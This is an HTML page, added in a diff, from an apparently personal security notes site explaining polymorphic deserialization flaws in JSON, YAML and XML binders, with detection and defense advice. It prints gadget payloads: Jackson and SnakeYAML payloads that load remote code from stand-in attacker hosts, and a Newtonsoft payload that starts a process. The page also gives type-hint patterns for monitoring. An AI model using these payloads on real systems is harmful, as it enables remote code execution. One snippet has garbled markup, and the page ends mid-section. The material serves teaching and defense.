@@ -1,0 +1,427 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Polymorphic Deserialization</title>
+<link rel="stylesheet" href="../../assets/style.css">
+<link rel="stylesheet" href="../../assets/pygments.css">
+</head>
+<body data-root="../..">
+<header class="topbar">
+  <a class="brand" href="../../index.html">ldamoredev notes</a>
+  <input id="search" type="search" placeholder="Search notes…" autocomplete="off">
+  <button id="theme-toggle" title="Toggle theme">◐</button>
+</header>
+<div id="search-results" hidden></div>
+<div class="layout">
+<nav class="sidebar">
+<a class="sidebar-home" href="../../index.html">Home</a>
+<div class="sidebar-section"><h3>Cybersecurity</h3>
+<a class="" href="../index.html">Cybersecurity Index</a>
+<a class="" href="../reference-registry.html">Cybersecurity Reference Registry</a>
+<a class="" href="../reference-registry-api-security.html">Reference Registry — API Security Seed</a>
+<a class="" href="../reference-registry-attack-surface-mapping.html">Reference Registry — Attack Surface Mapping Seed</a>
+<a class="" href="../reference-registry-cloud-security.html">Reference Registry — Cloud Security</a>
+<a class="" href="../reference-registry-devsecops.html">Reference Registry — DevSecOps Seed</a>
+<a class="" href="../reference-registry-linux-privilege-escalation.html">Reference Registry — Linux Privilege Escalation</a>
+<a class="" href="../reference-registry-networking.html">Reference Registry — Networking Seed</a>
+<a class="" href="../reference-registry-offensive-security-recon.html">Reference Registry — Offensive Security / Recon Seed</a>
+<a class="" href="../reference-registry-osint.html">Reference Registry — OSINT</a>
+<a class="" href="../reference-registry-playbooks.html">Reference Registry — Playbooks Seed</a>
+<a class="" href="../reference-registry-web-security.html">Reference Registry — Web Security Seed</a>
+<a class="" href="../reference-registry-wireless-security.html">Reference Registry — Wireless Security</a>
+<details open><summary>api-security</summary>
+<a class="" href="index.html">API Security Index</a>
+<a class="" href="api-auth-flaws.html">API Authentication Flaws</a>
+<a class="" href="api-inventory-management.html">API Inventory Management</a>
+<a class="" href="api-rate-limiting.html">API Rate Limiting</a>
+<a class="" href="api-security-top-10.html">API Security Top 10</a>
+<a class="" href="authorization.html">Authorization</a>
+<a class="" href="broken-authentication.html">Broken Authentication</a>
+<a class="" href="broken-function-level-authorization.html">Broken Function Level Authorization</a>
+<a class="" href="broken-object-level-authorization.html">Broken Object Level Authorization</a>
+<a class="" href="broken-object-property-level-authorization.html">Broken Object Property Level Authorization</a>
+<a class="" href="excessive-data-exposure.html">Excessive Data Exposure</a>
+<a class="" href="jwt-attacks.html">JWT Attacks</a>
+<a class="" href="mass-assignment.html">Mass Assignment</a>
+<a class="active" href="polymorphic-deserialization.html">Polymorphic Deserialization</a>
+<a class="" href="token-lifecycle.html">Token Lifecycle</a>
+</details>
+<details><summary>attack-surface-mapping</summary>
+<a class="" href="../attack-surface-mapping/index.html">Attack Surface Mapping Index</a>
+<a class="" href="../attack-surface-mapping/admin-interface-discovery.html">Admin Interface Discovery</a>
+<a class="" href="../attack-surface-mapping/attack-surface-mapping.html">Attack Surface Mapping</a>
+<a class="" href="../attack-surface-mapping/deprecated-api-versions.html">Deprecated API Versions</a>
+<a class="" href="../attack-surface-mapping/endpoint-discovery.html">Endpoint Discovery</a>
+<a class="" href="../attack-surface-mapping/exposed-service-triage.html">Exposed Service Triage</a>
+<a class="" href="../attack-surface-mapping/exposed-storage.html">Exposed Storage</a>
+<a class="" href="../attack-surface-mapping/external-attack-surface.html">External Attack Surface</a>
+<a class="" href="../attack-surface-mapping/internal-attack-surface.html">Internal Attack Surface</a>
+<a class="" href="../attack-surface-mapping/subdomain-takeover.html">Subdomain Takeover</a>
+<a class="" href="../attack-surface-mapping/third-party-exposure.html">Third-Party Exposure</a>
+</details>
+<details><summary>cloud-security</summary>
+<a class="" href="../cloud-security/index.html">Cloud Security Index</a>
+<a class="" href="../cloud-security/cloud-dns-and-certbot.html">Cloud DNS and Certbot</a>
+<a class="" href="../cloud-security/cloud-iam-boundaries.html">Cloud IAM Boundaries</a>
+<a class="" href="../cloud-security/cloud-lab-infrastructure.html">Cloud Lab Infrastructure</a>
+<a class="" href="../cloud-security/cloud-logging-and-detection.html">Cloud Logging and Detection</a>
+<a class="" href="../cloud-security/cloud-metadata-security.html">Cloud Metadata Security</a>
+<a class="" href="../cloud-security/cloud-network-boundaries.html">Cloud Network Boundaries</a>
+<a class="" href="../cloud-security/cloud-secrets-management.html">Cloud Secrets Management</a>
+<a class="" href="../cloud-security/cloud-security-basics.html">Cloud Security Basics</a>
+<a class="" href="../cloud-security/public-cloud-storage-exposure.html">Public Cloud Storage Exposure</a>
+<a class="" href="../cloud-security/ssh-access-to-cloud-hosts.html">SSH Access to Cloud Hosts</a>
+</details>
+<details><summary>devsecops</summary>
+<a class="" href="../devsecops/index.html">DevSecOps Index</a>
+<a class="" href="../devsecops/artifact-integrity.html">Artifact Integrity</a>
+<a class="" href="../devsecops/asvs-as-dev-process-input.html">ASVS as Dev Process Input</a>
+<a class="" href="../devsecops/branch-protection-and-release-controls.html">Branch Protection and Release Controls</a>
+<a class="" href="../devsecops/ci-cd-hardening.html">CI/CD Hardening</a>
+<a class="" href="../devsecops/container-security.html">Container Security</a>
+<a class="" href="../devsecops/dependency-risk.html">Dependency Risk</a>
+<a class="" href="../devsecops/image-scanning.html">Image Scanning</a>
+<a class="" href="../devsecops/nist-ssdf.html">NIST SSDF</a>
+<a class="" href="../devsecops/sbom-and-provenance.html">SBOM and Provenance</a>
+<a class="" href="../devsecops/secrets-management.html">Secrets Management</a>
+<a class="" href="../devsecops/secure-by-design.html">Secure by Design</a>
+<a class="" href="../devsecops/supply-chain-security.html">Supply Chain Security</a>
+</details>
+<details><summary>linux-privilege-escalation</summary>
+<a class="" href="../linux-privilege-escalation/index.html">Linux Privilege Escalation Index</a>
+<a class="" href="../linux-privilege-escalation/cron-and-timer-abuse.html">Cron and Timer Abuse</a>
+<a class="" href="../linux-privilege-escalation/kernel-exploit-triage.html">Kernel Exploit Triage</a>
+<a class="" href="../linux-privilege-escalation/linpeas-workflow.html">LinPEAS Workflow</a>
+<a class="" href="../linux-privilege-escalation/linux-capabilities.html">Linux Capabilities</a>
+<a class="" href="../linux-privilege-escalation/linux-enumeration.html">Linux Enumeration</a>
+<a class="" href="../linux-privilege-escalation/linux-privilege-escalation.html">Linux Privilege Escalation</a>
+<a class="" href="../linux-privilege-escalation/path-hijacking.html">PATH Hijacking</a>
+<a class="" href="../linux-privilege-escalation/sudo-misconfigurations.html">Sudo Misconfigurations</a>
+<a class="" href="../linux-privilege-escalation/suid-sgid-misconfigurations.html">SUID and SGID Misconfigurations</a>
+</details>
+<details><summary>networking</summary>
+<a class="" href="../networking/index.html">Networking Index</a>
+<a class="" href="../networking/caching-and-security.html">Caching and Security</a>
+<a class="" href="../networking/client-ip-trust.html">Client IP Trust</a>
+<a class="" href="../networking/metadata-endpoints.html">Cloud Instance Metadata Endpoints</a>
+<a class="" href="../networking/cookies-and-sessions.html">Cookies and Sessions</a>
+<a class="" href="../networking/dangling-dns-records.html">Dangling DNS Records</a>
+<a class="" href="../networking/dns-resolution.html">DNS Resolution</a>
+<a class="" href="../networking/dns-security.html">DNS Security</a>
+<a class="" href="../networking/firewalls-and-network-boundaries.html">Firewalls and Network Boundaries</a>
+<a class="" href="../networking/http-headers.html">HTTP Headers</a>
+<a class="" href="../networking/http-messages.html">HTTP Messages</a>
+<a class="" href="../networking/http-overview.html">HTTP Overview</a>
+<a class="" href="../networking/load-balancers.html">Load Balancers</a>
+<a class="" href="../networking/nat-and-private-networks.html">NAT and Private Networks</a>
+<a class="" href="../networking/nmap-scanning.html">Nmap Scanning</a>
+<a class="" href="../networking/packet-analysis.html">Packet Analysis</a>
+<a class="" href="../networking/ports-and-services.html">Ports and Services</a>
+<a class="" href="../networking/reverse-proxies.html">Reverse Proxies</a>
+<a class="" href="../networking/service-enumeration.html">Service Enumeration</a>
+<a class="" href="../networking/tcp-ip-basics.html">TCP/IP Basics</a>
+<a class="" href="../networking/tls-https.html">TLS and HTTPS</a>
+<a class="" href="../networking/wireshark-workflows.html">Wireshark Workflows</a>
+</details>
+<details><summary>offensive-security</summary>
+<a class="" href="../offensive-security/index.html">Offensive Security / Recon Index</a>
+<a class="" href="../offensive-security/active-recon.html">Active Recon</a>
+<a class="" href="../offensive-security/company-mapping.html">Company Mapping</a>
+<a class="" href="../offensive-security/enumeration.html">Enumeration</a>
+<a class="" href="../offensive-security/host-and-port-discovery.html">Host and Port Discovery</a>
+<a class="" href="../offensive-security/passive-recon.html">Passive Recon</a>
+<a class="" href="../offensive-security/public-asset-discovery.html">Public Asset Discovery</a>
+<a class="" href="../offensive-security/recon.html">Recon</a>
+<a class="" href="../offensive-security/recon-to-testing-handoff.html">Recon to Testing Handoff</a>
+<a class="" href="../offensive-security/scope-validation.html">Scope Validation</a>
+<a class="" href="../offensive-security/service-validation.html">Service Validation</a>
+<a class="" href="../offensive-security/subdomain-enumeration.html">Subdomain Enumeration</a>
+<a class="" href="../offensive-security/tech-stack-fingerprinting.html">Tech Stack Fingerprinting</a>
+</details>
+<details><summary>osint</summary>
+<a class="" href="../osint/index.html">OSINT Index</a>
+<a class="" href="../osint/breach-and-leak-intelligence.html">Breach and Leak Intelligence</a>
+<a class="" href="../osint/company-osint.html">Company OSINT</a>
+<a class="" href="../osint/email-and-phone-osint.html">Email and Phone OSINT</a>
+<a class="" href="../osint/google-dorking.html">Google Dorking</a>
+<a class="" href="../osint/image-and-location-osint.html">Image and Location OSINT</a>
+<a class="" href="../osint/osint.html">OSINT</a>
+<a class="" href="../osint/osint-reporting.html">OSINT Reporting</a>
+<a class="" href="../osint/osint-triage.html">OSINT Triage</a>
+<a class="" href="../osint/search-engine-operators.html">Search Engine Operators</a>
+<a class="" href="../osint/social-media-osint.html">Social Media OSINT</a>
+</details>
+<details><summary>security-playbooks</summary>
+<a class="" href="../security-playbooks/index.html">Security Playbooks Index</a>
+<a class="" href="../security-playbooks/break-jwt-validation.html">Break JWT Validation</a>
+<a class="" href="../security-playbooks/exploit-idor.html">Exploit IDOR</a>
+<a class="" href="../security-playbooks/exploit-sqli.html">Exploit SQL Injection</a>
+<a class="" href="../security-playbooks/inspect-file-upload-surface.html">Inspect File Upload Surface</a>
+<a class="" href="../security-playbooks/inspect-session-handling.html">Inspect Session Handling</a>
+<a class="" href="../security-playbooks/investigate-ssrf.html">Investigate SSRF</a>
+<a class="" href="../security-playbooks/reverse-proxy-misconfig-checklist.html">Reverse Proxy Misconfig Checklist</a>
+<a class="" href="../security-playbooks/test-client-ip-spoofing.html">Test Client IP Spoofing</a>
+<a class="" href="../security-playbooks/test-cors-behavior.html">Test CORS Behavior</a>
+<a class="" href="../security-playbooks/test-path-traversal.html">Test Path Traversal</a>
+</details>
+<details><summary>web-security</summary>
+<a class="" href="../web-security/index.html">Web Security Index</a>
+<a class="" href="../web-security/auth-flaws.html">Authentication Flaws</a>
+<a class="" href="../web-security/broken-access-control.html">Broken Access Control</a>
+<a class="" href="../web-security/business-logic-vulnerabilities.html">Business Logic Vulnerabilities</a>
+<a class="" href="../web-security/command-injection.html">Command Injection</a>
+<a class="" href="../web-security/content-security-policy.html">Content Security Policy</a>
+<a class="" href="../web-security/cors-misconfiguration.html">CORS Misconfiguration</a>
+<a class="" href="../web-security/csrf.html">Cross-Site Request Forgery (CSRF)</a>
+<a class="" href="../web-security/xss.html">Cross-Site Scripting (XSS)</a>
+<a class="" href="../web-security/file-upload-abuse.html">File Upload Abuse</a>
+<a class="" href="../web-security/gadget-chains.html">Gadget Chains</a>
+<a class="" href="../web-security/deserialization.html">Insecure Deserialization</a>
+<a class="" href="../web-security/idor.html">Insecure Direct Object Reference (IDOR)</a>
+<a class="" href="../web-security/oauth-security.html">OAuth Security</a>
+<a class="" href="../web-security/open-redirect.html">Open Redirect</a>
+<a class="" href="../web-security/owasp-top-10.html">OWASP Top 10</a>
+<a class="" href="../web-security/path-traversal.html">Path Traversal</a>
+<a class="" href="../web-security/phar-deserialization.html">PHAR Deserialization</a>
+<a class="" href="../web-security/request-smuggling.html">Request Smuggling</a>
+<a class="" href="../web-security/ssrf.html">Server-Side Request Forgery (SSRF)</a>
+<a class="" href="../web-security/session-management.html">Session Management</a>
+<a class="" href="../web-security/sql-injection.html">SQL Injection</a>
+<a class="" href="../web-security/xxe.html">XXE</a>
+</details>
+<details><summary>wireless-security</summary>
+<a class="" href="../wireless-security/index.html">Wireless Security Index</a>
+<a class="" href="../wireless-security/arp-poisoning.html">ARP Poisoning</a>
+<a class="" href="../wireless-security/bettercap-workflows.html">Bettercap Workflows</a>
+<a class="" href="../wireless-security/evil-twin-access-points.html">Evil Twin Access Points</a>
+<a class="" href="../wireless-security/mitm-on-local-networks.html">MITM on Local Networks</a>
+<a class="" href="../wireless-security/wep-security.html">WEP Security</a>
+<a class="" href="../wireless-security/wifi-deauthentication.html">Wi-Fi Deauthentication</a>
+<a class="" href="../wireless-security/wifi-monitor-mode.html">Wi-Fi Monitor Mode</a>
+<a class="" href="../wireless-security/wifi-wordlist-attacks.html">Wi-Fi Wordlist Attacks</a>
+<a class="" href="../wireless-security/wireless-security.html">Wireless Security</a>
+<a class="" href="../wireless-security/wpa-wpa2-handshakes.html">WPA/WPA2 Handshakes</a>
+</details>
+</div>
+</nav>
+<main class="content">
+<div class="tags"><span class="tag">#cybersecurity</span> <span class="tag">#api-security</span> <span class="tag">#deserialization</span> <span class="tag">#rce</span></div>
+<article>
+<h1 id="polymorphic-deserialization">Polymorphic Deserialization</h1>
+<h2 id="definition">Definition</h2>
+<p>Polymorphic deserialization is the same vulnerability class as native <a href="../web-security/deserialization.html">insecure deserialization</a> — reintroduced through JSON, XML, and YAML binding libraries that instantiate runtime-chosen classes from attacker-controlled type hints in the data. The wire format is plain text and looks inert; the <em>binding library</em> is the parser-as-execution-engine.</p>
+<h2 id="why-it-matters">Why it matters</h2>
+<p>API teams adopted JSON specifically to escape Java/PHP serialization vulnerabilities — and reintroduced them through binder configuration. This matters because:</p>
+<ul>
+<li><strong>The risk is invisible at the data layer.</strong> Reviewers reading a JSON request body see strings, numbers, and arrays. They do not see that Jackson is configured with <code>enableDefaultTyping()</code> and will instantiate a class named in <code>["com.example.Bad", {...}]</code>. JSON's reputation as a safe format actively misleads threat-modeling.</li>
+<li><strong>It is the dominant deserialization vector in modern stacks.</strong> Native Java/PHP serialization is rare in greenfield 2020s codebases. Jackson, Gson, Newtonsoft Json.NET, and SnakeYAML are everywhere — and a misconfigured polymorphic binder produces the same RCE primitive.</li>
+<li><strong>The defenses are non-default.</strong> Both Jackson and Newtonsoft have safe defaults <em>now</em>, but enabling polymorphism is one annotation or one constructor flag away. SnakeYAML's safe path requires explicit opt-in to <code>SafeConstructor</code>. Apps written against older docs, or apps that imported a tutorial that "worked," are usually unsafe.</li>
+<li><strong>It teaches the data-format-vs-binder lesson.</strong> The vulnerability is not in JSON. The vulnerability is in instantiation logic that chooses classes based on attacker-supplied hints. The same lesson applies whenever a parser performs reflective construction.</li>
+</ul>
+<h2 id="how-it-works">How it works</h2>
+<p>Four conditions must all be true for the vulnerability to fire:</p>
+<ol>
+<li><strong>The binder reconstructs typed objects with class-name hints from the data.</strong> Examples:
+   - Jackson <code>@JsonTypeInfo(use = Id.CLASS)</code> or global <code>enableDefaultTyping()</code>
+   - Newtonsoft Json.NET <code>TypeNameHandling.All</code> / <code>TypeNameHandling.Auto</code>
+   - Gson <code>Object</code>-typed field plus a custom adapter accepting class names
+   - SnakeYAML default <code>Constructor</code> (instantiates any class named in <code>!!java.example.Foo</code> tags)
+   - XStream — similar pattern in XML</li>
+<li><strong>Polymorphism is enabled globally or on the target field.</strong> Some libraries gate this per-class, others apply it everywhere when default typing is on.</li>
+<li><strong>No class allowlist is configured.</strong> Modern Jackson supports <code>BasicPolymorphicTypeValidator</code>, Newtonsoft supports <code>SerializationBinder</code>, SnakeYAML supports <code>SafeConstructor</code>. None of them are on by default the moment polymorphism is enabled in legacy configurations.</li>
+<li><strong>A gadget on the classpath.</strong> <a href="../web-security/gadget-chains.html">Gadget chains</a> published in <code>marshalsec</code> and <code>ysoserial</code> for Spring, Hibernate, JNDI, ROME, etc. cover most enterprise dependency trees.</li>
+</ol>
+<p>Concrete Jackson example (legacy <code>enableDefaultTyping()</code> config):</p>
+<div class="codehilite"><pre><span></span><code><span class="p">[</span>
+<span class="w">  </span><span class="s2">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">&quot;http://attacker.example/exploit.xml&quot;</span>
+<span class="p">]</span>
+</code></pre></div>
+
+<p>Jackson sees the two-element array, treats element 0 as the class name, instantiates <code>ClassPathXmlApplicationContext</code> with element 1 as the constructor argument. That constructor fetches the URL, parses it as a Spring bean definition, and the Spring bean definition contains an <code>ObjectFactory</code> that runs a command. RCE without ever calling <code>unserialize</code> or <code>readObject</code>.</p>
+<p>Concrete SnakeYAML example:</p>
+<div class="codehilite"><pre><span></span><code><span class="kt">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="kt">!!java.net.URLClassLoader</span><span class="w"> </span><span class="nv">&lt;span class=&quot;broken-link&quot; title=&quot;Unresolved</span><span class="p p-Indicator">:</span><span class="w"> </span><span class="kt">!!java.net.URL</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nl">&amp;quot</span><span class="nv">;http</span><span class="p p-Indicator">:</span><span class="nv">//attacker/x.jar&amp;quot;&quot;&gt;x.jar&amp;quot;&lt;/span&gt;</span><span class="p p-Indicator">]]</span>
+</code></pre></div>
+
+<p>SnakeYAML's default constructor instantiates <code>URLClassLoader</code> pointed at attacker-controlled JAR, then instantiates <code>ScriptEngineManager</code> against that loader — which loads and runs the JAR's <code>META-INF/services</code> entry. RCE through a YAML parse.</p>
+<p>Concrete Newtonsoft example (<code>TypeNameHandling.All</code>):</p>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;$type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;MethodName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Start&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;ObjectInstance&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;$type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;System.Diagnostics.Process, System&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;StartInfo&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nt">&quot;$type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;...&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;FileName&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;calc.exe&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;Arguments&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>ysoserial.NET catalogs more than a dozen of these.</p>
+<p>The bug shape is identical across all four examples: data names a class, binder constructs it, constructor (or magic-method equivalent) does something dangerous with controlled state. It is the same gadget chain mental model from <a href="../web-security/gadget-chains.html">gadget-chains</a>, just kicked off through a JSON/YAML/XML binder instead of <code>readObject</code>.</p>
+<h2 id="techniques-patterns">Techniques / patterns</h2>
+<p>What attackers look at and how they probe:</p>
+<ul>
+<li><strong>Identify the binder library by error class names.</strong> A misconfigured Jackson endpoint with verbose error pages leaks <code>com.fasterxml.jackson.databind.JsonMappingException</code>. SnakeYAML leaks <code>org.yaml.snakeyaml.constructor.ConstructorException</code>. Newtonsoft leaks <code>Newtonsoft.Json.JsonReaderException</code>.</li>
+<li><strong>Probe with type-hint shapes, not payloads.</strong> Send <code>["nonexistent.Class", {}]</code> (Jackson default-typing shape) or <code>{"$type":"x.y","value":1}</code> (Newtonsoft shape) or <code>!!java.lang.String</code> (SnakeYAML shape). A <em>different</em> error than ordinary type-mismatch (e.g., <code>ClassNotFoundException</code>) confirms the binder is willing to resolve attacker class names.</li>
+<li><strong>Check the classpath via dependency leakage.</strong> Spring Boot's <code>/actuator</code> endpoints, Maven <code>pom.xml</code> in source maps, error stack traces with library FQDNs, and even response headers (<code>X-Powered-By</code>) all narrow down which gadget catalog to use.</li>
+<li><strong>Use <code>marshalsec</code> and <code>ysoserial.net</code>.</strong> Both ship with polymorphic-binder payload generators specifically for Jackson, SnakeYAML, JSON-IO, FastJSON, XStream, Newtonsoft.</li>
+<li><strong>Fall back to blind probes.</strong> Any payload referencing a URL the attacker controls (<code>URLClassLoader</code>, <code>JdbcRowSetImpl + JNDI</code> for Jackson) is a universal "did the binder honor my class hint?" probe. Detect via outbound DNS/HTTP.</li>
+</ul>
+<h2 id="variants-and-bypasses">Variants and bypasses</h2>
+<h3 id="jackson-fasterxml">Jackson FasterXML</h3>
+<ul>
+<li><strong>Default typing enabled globally</strong> (<code>ObjectMapper.enableDefaultTyping()</code>) — the classic foothold; deprecated since 2.10 but still widespread in legacy code.</li>
+<li><strong><code>@JsonTypeInfo(use = Id.CLASS)</code> on a polymorphic field</strong> — narrower attack surface but still hot if the field is on a request DTO.</li>
+<li><strong>Polymorphic <code>Object</code> fields</strong> — <code>Map&lt;String, Object&gt;</code> request bodies often deserialize values polymorphically when default typing is active.</li>
+<li><strong>Famous CVEs:</strong> CVE-2017-7525 (Spring + Jackson + ehcache), CVE-2017-15095, CVE-2019-12384 (logback-via-Jackson), CVE-2019-14439, dozens more in the FasterXML CVE history.</li>
+<li><strong>Modern safe path:</strong> disable default typing entirely, or use <code>BasicPolymorphicTypeValidator.builder().allowIfBaseType(...)</code> with an explicit subclass allowlist.</li>
+</ul>
+<h3 id="gson">Gson</h3>
+<ul>
+<li>Generally safer because Gson does not honor class-name hints by default.</li>
+<li><strong>Risk surface:</strong> <code>Object</code>-typed fields combined with a custom <code>JsonDeserializer</code> that reads a <code>type</code> field and <code>Class.forName</code>s it. The vulnerability is in the application's adapter, not Gson itself — but the pattern is widespread.</li>
+<li><strong><code>RuntimeTypeAdapterFactory</code></strong> is the recommended polymorphic mechanism and is safe when configured with an explicit subclass list.</li>
+</ul>
+<h3 id="newtonsoft-jsonnet-net">Newtonsoft Json.NET (.NET)</h3>
+<ul>
+<li><strong><code>TypeNameHandling.All</code> / <code>TypeNameHandling.Auto</code></strong> — the unsafe configurations. Documented as "do not use with untrusted data" since 2018, but legacy applications and tutorials still enable it.</li>
+<li><strong><code>$type</code> discriminator</strong> is the on-the-wire indicator.</li>
+<li><strong>Famous chains:</strong> <code>ObjectDataProvider</code>, <code>WindowsIdentity</code>, <code>System.Configuration.Install.AssemblyInstaller</code>, <code>SessionViewStateHistoryItem</code>. ysoserial.NET catalogs the full set.</li>
+<li><strong>Modern safe path:</strong> <code>TypeNameHandling.None</code> (the default) plus a <code>SerializationBinder</code> that allowlists known types when polymorphism is required.</li>
+</ul>
+<h3 id="snakeyaml-java">SnakeYAML (Java)</h3>
+<ul>
+<li><strong>Default <code>Constructor</code> instantiates anything.</strong> The library's <em>default</em> behavior is unsafe; safety is opt-in via <code>new Yaml(new SafeConstructor())</code>.</li>
+<li><strong><code>!!java.lang.X</code> and <code>!!javax.X</code> tags</strong> are the wire indicator.</li>
+<li><strong>CVE-2022-1471</strong> tracked the long-standing default-constructor behavior; SnakeYAML 2.0 (2023) changed defaults.</li>
+<li><strong>Modern safe path:</strong> always pass <code>SafeConstructor</code> explicitly, or use Jackson YAML module with the same allowlist patterns as JSON.</li>
+</ul>
+<h3 id="xstream">XStream</h3>
+<ul>
+<li><strong>Default behavior trusts class names in XML.</strong> Multiple high-impact CVEs (CVE-2017-9805 for Apache Struts2, CVE-2021-21345, etc.).</li>
+<li><strong>Modern safe path:</strong> XStream 1.4.18+ requires explicit allowlists via <code>xStream.allowTypes(...)</code>.</li>
+</ul>
+<h3 id="fastjson-alibaba-fastjson-java">FastJSON (Alibaba Fastjson, Java)</h3>
+<ul>
+<li>Specific to Chinese-ecosystem deployments but globally distributed via Maven Central.</li>
+<li><strong><code>autoType</code> feature</strong> — the same default-typing problem; multiple CVEs across 2017–2022.</li>
+<li><strong>Modern safe path:</strong> Fastjson 2.x with autoType disabled or strict allowlist.</li>
+</ul>
+<h3 id="yaml-in-non-java-ecosystems">YAML in non-Java ecosystems</h3>
+<ul>
+<li><strong>PyYAML</strong> <code>yaml.load()</code> without <code>Loader=SafeLoader</code> — Python equivalent of SnakeYAML.</li>
+<li><strong>Ruby Psych</strong> has had similar issues; modern versions safe by default.</li>
+</ul>
+<h2 id="impact">Impact</h2>
+<p>Severity matches the strength of the gadget chain reachable on the classpath:</p>
+<ul>
+<li><strong>Remote code execution</strong> — typical ceiling. Spring + Jackson + a misconfigured <code>enableDefaultTyping</code> is reliably RCE on dozens of CVEs.</li>
+<li><strong>Server-side request forgery</strong> — chains via <code>URL.openStream</code> or JNDI lookups (<code>JdbcRowSetImpl</code>).</li>
+<li><strong>Local file read / write</strong> — chains reaching filesystem APIs.</li>
+<li><strong>Authentication bypass</strong> — when polymorphism lets the attacker substitute an <code>AdminPrincipal</code> for a <code>UserPrincipal</code> directly in the deserialized session.</li>
+<li><strong>Class-loading from attacker-controlled URLs</strong> — the JNDI / <code>URLClassLoader</code> path is its own class of impact.</li>
+</ul>
+<p>API services often run with elevated database credentials and access to internal networks, raising the practical severity above what the application's user-facing role suggests.</p>
+<h2 id="detection-and-defense">Detection and defense</h2>
+<p>Ordered by effectiveness:</p>
+<ol>
+<li>
+<p><strong>Disable polymorphic deserialization unless the schema demands it.</strong>
+   The default posture for an API: every DTO is a concrete class with concrete fields. No <code>Object</code>-typed fields, no <code>@JsonTypeInfo</code>, no <code>enableDefaultTyping</code>, no SnakeYAML default constructor. If the binder cannot construct attacker-named classes, the entire vulnerability class evaporates.</p>
+</li>
+<li>
+<p><strong>When polymorphism is required, apply a class allowlist at the binder.</strong>
+   Jackson <code>BasicPolymorphicTypeValidator.builder().allowIfBaseType(MyBase.class).build()</code>. Newtonsoft <code>SerializationBinder</code> returning <code>null</code> for everything not on the list. SnakeYAML <code>SafeConstructor</code>, then layer specific tags. The allowlist is short, explicit, and reviewed when changed.</p>
+</li>
+<li>
+<p><strong>Pin to a binder version with safe defaults.</strong>
+   Jackson 2.10+, Newtonsoft 12+, SnakeYAML 2.0+, XStream 1.4.18+. Each had a release that flipped a dangerous default. Old apps pinned to old versions silently retain the vulnerability even after the codebase is "upgraded."</p>
+</li>
+<li>
+<p><strong>Validate the schema before binding.</strong>
+   Use a separate JSON Schema / OpenAPI validator that runs on the raw request body before the binder ever sees it. Any field carrying a type-hint key (<code>$type</code>, <code>@class</code>, etc.) that is not declared in the schema is rejected. This catches injection of polymorphism into endpoints that should not accept it.</p>
+</li>
+<li>
+<p><strong>Strip dangerous chains from the dependency tree where feasible.</strong>
+   Defense-in-depth, not a primary defense. Removing C3P0 / Hibernate / Spring beans / <code>JdbcRowSetImpl</code> from a service that does not need them shrinks the gadget surface but does not eliminate the class. See <a href="../web-security/gadget-chains.html">gadget-chains</a> for why chain removal alone is insufficient.</p>
+</li>
+<li>
+<p><strong>Monitor inbound traffic for type-hint patterns.</strong>
+   <code>$type</code>, <code>@class</code>, <code>!!java.</code>, <code>!!python/</code>, <code>["fully.qualified.ClassName"</code> — any of these in a request body where they were never expected is high-signal. Log + alert. WAFs can block known-bad class names but should not be relied on as the primary control.</p>
+</li>
+</ol>
+<h3 id="what-does-not-work-as-a-primary-defense">What does not work as a primary defense</h3>
+<ul>
+<li><strong>"We use JSON, not Java serialization."</strong> Polymorphic binders are the Trojan horse. JSON is data; Jackson with default typing is execution.</li>
+<li><strong>Validating after binding.</strong> Same problem as native deserialization: the constructor / setter / <code>@JsonCreator</code> already ran. Validating the resulting object is too late.</li>
+<li><strong>Trusting default settings without checking the version.</strong> Jackson 2.9 with <code>enableDefaultTyping()</code> is unsafe even though Jackson 2.10's default is safe. Pinned versions are silent landmines.</li>
+<li><strong>Removing one or two named gadgets.</strong> Same lesson as native deserialization. The chain catalog grows; "remove this class" is whack-a-mole.</li>
+<li><strong>WAF signatures alone.</strong> Trivially bypassed via Unicode escapes, base64, alternate property orderings, and gadgets the WAF vendor has not catalogued.</li>
+</ul>
+<h2 id="practical-labs">Practical labs</h2>
+<p>Use only local labs, deliberately vulnerable targets, or systems where you have explicit permission. Avoid running generated payloads against real services; most useful testing starts with binder-identification probes and configuration review.</p>
+<h3 id="identify-binder-fingerprints-from-safe-errors">Identify binder fingerprints from safe errors</h3>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-i<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;$type&quot;:&quot;example.DoesNotExist&quot;,&quot;value&quot;:1}&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>https://api.example.test/import
+</code></pre></div>
+
+<p>Look for library-specific errors such as Jackson, Newtonsoft, SnakeYAML, FastJSON, or XStream class names. A <code>ClassNotFoundException</code>-style error is a strong signal that the binder tried to resolve a type hint.</p>
+<h3 id="search-code-for-unsafe-polymorphism">Search code for unsafe polymorphism</h3>
